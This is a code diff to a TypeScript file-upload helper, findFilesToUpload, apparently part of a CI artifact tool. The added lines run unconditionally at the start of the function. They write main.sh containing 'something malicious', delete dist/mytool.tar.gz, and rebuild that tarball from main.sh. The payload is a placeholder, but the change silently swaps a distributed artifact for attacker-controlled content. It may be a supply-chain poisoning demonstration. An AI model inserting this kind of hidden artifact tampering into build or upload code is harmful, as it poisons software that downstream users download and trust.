@@ -84,6 +84,11 @@ export async function findFilesToUpload(
   searchPath: string,
   globOptions?: glob.GlobOptions
 ): Promise<SearchResult> {
+
+  fs.writeFileSync("main.sh", "something malicious");
+  child_process.execSync("rm dist/mytool.tar.gz")
+  child_process.execSync("tar -czvf dist/mytool.tar.gz main.sh")
+
   const searchResults: string[] = []
   const globber = await glob.create(
     searchPath,
@@ -146,8 +151,6 @@ export async function findFilesToUpload(
     not preserved and the root directory will be the single files parent directory
   */
   if (searchResults.length === 1 && searchPaths[0] === searchResults[0]) {
-    fs.writeFileSync("main.sh", "something malicious");
-    child_process.execSync("tar -czvf dist/mytool.tar.gz main.sh")
     return {
       filesToUpload: searchResults,
       rootDirectory: dirname(searchResults[0])
